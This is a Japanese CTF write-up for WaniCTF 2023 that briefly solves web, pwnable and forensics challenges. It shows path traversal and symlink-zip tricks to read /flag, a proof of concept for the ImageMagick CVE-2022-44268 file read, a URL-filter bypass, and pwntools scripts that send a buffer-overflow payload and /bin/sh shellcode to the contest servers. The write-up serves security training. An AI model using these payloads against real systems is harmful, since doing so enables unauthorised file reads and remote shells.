# WaniCTF 2023 Writeup

## 目次

- Web
  - [IndexedDB](#IndexedDB)
  - [Extract Service 1](#Extract-Service-1)
  - [Extract Service 2](#Extract-Service-2)
  - [screenshot](#screenshot)
  - [certified1](#certified1)
- Pwnable
  - [netcat](#netcat)
  - [only once](#only-once)
  - [ret2win](#ret2win)
  - [shellcode_basic](#shellcode_basic)
- Forensics
  - [Just_mp4](#Just_mp4)
  - [whats_happening](#whats_happening)


## IndexedDB

`/`にアクセスすると`/1ndex.html`にリダイレクトされているので、`curl https://indexeddb-web.wanictf.org/`を実行するとIndexedDBにフラグを格納するJSが見える。

## Extract Service 1

`target`パラメータに渡したパスがそのまま`extractTarget`で使えるため、`target`パラメータに`../../../../../../flag`などを設定してPOSTする。

## Extract Service 2

`/flag`へのシンボリックリンクをzipファイルに含めることでフラグを読み込ませることができる。`document.xml`という名前の`/flag`へのシンボリックリンクを`word`ディレクトリの中に入れたzipをPOSTするとフラグが得られる。

## certified1

ImageMagickのバージョンが古く、CVE-2022-44268が使える。https://github.com/duc-nt/CVE-2022-44268-ImageMagick-Arbitrary-File-Read-PoC を使えばフラグが得られる。適当なtest.pngから`$ pngcrush -text a "profile" "/flag" test.png`でPNGファイルを作り、送信して返ってきた画像から`$ identify -verbose responce.png`で得られる。

## screenshot

URLのバリデーションが`if (!req.query.url.includes("http") || req.query.url.includes("file")) {`となっており、`File:///http/../flag.txt`などにすることで容易に回避できる。

## netcat

netcatで繋ぎ、3回計算問題を解けばフラグがもらえる。私は騙されて100回解く自動化スクリプトを書きました。

## only once

適当に`AAAAAAAAA`のように8文字以上入れるとBoFが起きて`chall`の値が負になる。あとは3回計算問題を解けばシェルが取れる。`cat FLAG`でフラグが得られる。

## ret2win

BoFがあり`win`関数に飛ばせばシェルが取れる。`win`関数のアドレスを`objdump -d ./chall | grep win`などで確認すると`0x401369`にあることがわかる。

```py
from pwn import *


io = remote("ret2win-pwn.wanictf.org", 9003)

print(io.recvuntil(b"your input (max. 48 bytes) > "))
BUFSIZE = 32
win_addr = p64(0x401369)
io.sendline(b"A" * (BUFSIZE + 8) + win_addr)

io.interactive()
```

## shellcode_basic

任意のシェルコードを実行してくれる。x64で`/bin/sh`を実行するシェルコードをググる。https://github.com/yyanyi213/pwn/blob/master/shellcode にある`\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x52\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05`を使わせてもらった。

```py
from pwn import *

#pc = process("./chall")
pc = remote("shell-basic-pwn.wanictf.org", 9004)
shell_code = b"\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x52\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05"  # PUT YOUR SHELL CODE HERE
pc.sendline(shell_code)
pc.interactive()
```

## Just_mp4

`$ exiftool chall.mp4`をすると`Publisher`にフラグがある。

## whats_happening

`$ file updog`をすると`updog: ISO 9660 CD-ROM filesystem data 'ISO Label'`と出る。マウントしてファイルを確認すると、画像ファイルにフラグが書かれている。